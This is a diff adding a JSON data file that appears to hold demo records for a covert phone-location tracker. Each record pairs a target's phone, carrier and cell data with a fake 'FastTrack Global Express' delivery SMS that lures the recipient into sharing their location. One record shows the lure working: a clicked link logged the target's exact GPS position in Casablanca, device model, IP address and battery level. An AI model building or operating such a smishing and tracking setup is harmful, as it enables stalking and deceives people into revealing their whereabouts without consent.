@@ -1,0 +1,111 @@
+[
+  {
+    "id": "b603e957-1872-419a-9d19-7bb6022ebb63",
+    "userId": "user_demo_01",
+    "phone": "0661225500",
+    "phoneInfo": {
+      "valid": true,
+      "phoneNumber": "0661225500",
+      "country": "Global / International",
+      "countryCode": "+1",
+      "flag": "🌐",
+      "carrier": "GSM Global Network",
+      "region": "International",
+      "lineType": "Mobile (GSM / 4G / 5G LTE)",
+      "imsiPrefix": "31001xxxxxx",
+      "mcc": "310",
+      "mnc": "01",
+      "cellId": 73492,
+      "rssi": "-78 dBm",
+      "frequency": "2100 MHz (IMT)",
+      "approximateCoords": {
+        "lat": 31.80619866242966,
+        "lng": -7.09560337492679
+      }
+    },
+    "pretext": {
+      "title": "Express Delivery - Real-time Package Tracking",
+      "company": "FastTrack Global Express",
+      "smsBody": "[Notice] Package #TRK-999335 is out for delivery. Confirm your exact drop-off coordinates:",
+      "icon": "📦"
+    },
+    "status": "ACTIVE_WAITING",
+    "createdAt": "2026-10-07T14:01:26.363Z",
+    "linkClicks": 0,
+    "targetLocation": null,
+    "targetDeviceInfo": null,
+    "history": [
+      {
+        "timestamp": "2026-10-07T14:01:26.363Z",
+        "event": "Tracking link generated & ready for GSM dispatch"
+      }
+    ]
+  },
+  {
+    "id": "demo-track-iam",
+    "userId": "user_demo_01",
+    "phone": "+212 661-234567",
+    "phoneInfo": {
+      "valid": true,
+      "phoneNumber": "+212661234567",
+      "country": "Morocco",
+      "countryCode": "+212",
+      "flag": "🇲🇦",
+      "carrier": "Orange Maroc",
+      "region": "North Africa",
+      "lineType": "Mobile (GSM / 4G / 5G LTE)",
+      "imsiPrefix": "60401xxxxxx",
+      "mcc": "604",
+      "mnc": "01",
+      "cellId": 28354,
+      "rssi": "-76 dBm",
+      "frequency": "2100 MHz (IMT)",
+      "approximateCoords": {
+        "lat": 33.5690391248618,
+        "lng": -7.5833327817451925
+      }
+    },
+    "pretext": {
+      "title": "Express Delivery - Real-time Package Tracking",
+      "company": "FastTrack Global Express",
+      "smsBody": "[Notice] Package #TRK-884920 is out for delivery. Confirm your exact drop-off coordinates:",
+      "icon": "📦"
+    },
+    "status": "LOCATED",
+    "createdAt": "2026-10-07T13:35:27.922Z",
+    "linkClicks": 2,
+    "targetLocation": {
+      "latitude": 33.5731,
+      "longitude": -7.5898,
+      "accuracy": 4.2,
+      "altitude": 28,
+      "speed": 0,
+      "heading": 0,
+      "timestamp": "2026-10-07T13:48:27.922Z"
+    },
+    "targetDeviceInfo": {
+      "platform": "iPhone 15 Pro (iOS 17.5)",
+      "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)",
+      "ip": "196.200.174.52",
+      "battery": "84% (Charging)"
+    },
+    "history": [
+      {
+        "timestamp": "2026-10-07T13:35:27.922Z",
+        "event": "Tracking created"
+      },
+      {
+        "timestamp": "2026-10-07T13:36:27.922Z",
+        "event": "Encrypted SMS dispatched via GSM gateway"
+      },
+      {
+        "timestamp": "2026-10-07T13:47:27.922Z",
+        "event": "Target opened link on Mobile Safari"
+      },
+      {
+        "timestamp": "2026-10-07T13:48:27.922Z",
+        "event": "GPS coordinates locked: Lat 33.5731, Lng -7.5898 (Casablanca)"
+      }
+    ]
+  }
+]
